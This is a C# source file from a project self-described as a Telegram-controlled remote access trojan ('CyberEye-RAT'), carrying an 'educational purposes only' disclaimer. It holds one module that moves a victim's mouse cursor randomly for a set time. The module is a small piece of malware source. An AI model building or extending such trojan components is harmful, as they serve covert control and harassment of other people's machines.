/*
       ^ Author    : Cisamu
       ^ Name      : CyberEye-RAT
       ^ Github    : https://github.com/cisamu123
       > This program is distributed for educational purposes only.
*/

using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace TelegramRAT.modded
{
    internal sealed class SetRandomCurPos
    {
        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int X, int Y);
        public static void Set(int durationMs)
        {
            Random random = new Random();

            Point currentPosition = Cursor.Position;

            Rectangle screenBounds = Screen.PrimaryScreen.Bounds;

            DateTime startTime = DateTime.Now;

            while ((DateTime.Now - startTime).TotalMilliseconds < durationMs)
            {
                int randomX = random.Next(screenBounds.Left, screenBounds.Right);
                int randomY = random.Next(screenBounds.Top, screenBounds.Bottom);

                SetCursorPos(randomX, randomY);

                Thread.Sleep(100);
            }

            SetCursorPos(currentPosition.X, currentPosition.Y);
        }
    }
}
